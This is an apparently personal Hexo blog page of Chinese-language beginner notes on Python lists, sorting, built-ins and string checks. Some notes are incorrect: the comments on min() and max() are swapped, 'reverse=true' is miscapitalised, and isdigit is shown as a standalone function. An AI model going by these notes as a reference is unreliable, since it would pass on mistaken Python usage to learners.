-<h4 id="根据值删除元素"><a href="#根据值删除元素" class="headerlink" title="根据值删除元素"></a>根据值删除元素</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">motorcycles &#x3D; [&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;, &#39;ducati&#39;]  print(motorcycles) </span><br><span class="line">too_expensive &#x3D; &#39;ducati&#39; </span><br><span class="line"></span><br><span class="line">motorcycles.remove(too_expensive)  </span><br><span class="line">print(motorcycles) </span><br><span class="line">print(&quot;\nA &quot; + too_expensive.title() + &quot; is too expensive for me.&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;, &#39;ducati&#39;] </span><br><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;] </span><br><span class="line">A Ducati is too expensive for me.</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="组织列表"><a href="#组织列表" class="headerlink" title="组织列表"></a>组织列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list.sort()   &#x2F;&#x2F;对列表进行永久性排序（a-z）</span><br><span class="line">list.sort(reverse&#x3D;true)   &#x2F;&#x2F;对列表进行永久性倒叙排序（z-a）</span><br><span class="line">sorted(list)   &#x2F;&#x2F;对列表进行临时性排序</span><br><span class="line"></span><br><span class="line">list.reverse()   &#x2F;&#x2F;倒着打印列表(这玩意有点奇妙，你不能把它放print里面，像print(list.reverse())</span><br><span class="line"></span><br><span class="line">len(list)   &#x2F;&#x2F;获取列表的长度(记得打印)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">range(start_num,finish_num,step)</span><br><span class="line">list()   &#x2F;&#x2F;将括号内转化为列表</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="处理一堆数字的列表"><a href="#处理一堆数字的列表" class="headerlink" title="处理一堆数字的列表"></a>处理一堆数字的列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">min()   &#x2F;&#x2F;最大值</span><br><span class="line">max()   &#x2F;&#x2F;最小值</span><br><span class="line">sum()   &#x2F;&#x2F;总和</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set()    &#x2F;&#x2F;去除其中重复值</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name.split()    &#x2F;&#x2F;以空格为界限，把字符串分割成若干块并放入列表</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="判断字符类型"><a href="#判断字符类型" class="headerlink" title="判断字符类型"></a>判断字符类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isinstance(string,type)    &#x2F;&#x2F;判断string是否是type类型，返回布尔值</span><br><span class="line">isdigit(string)            &#x2F;&#x2F;判断字符串是否为数字</span><br></pre></td></tr></table></figure>
-
 </div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/6/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/8/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
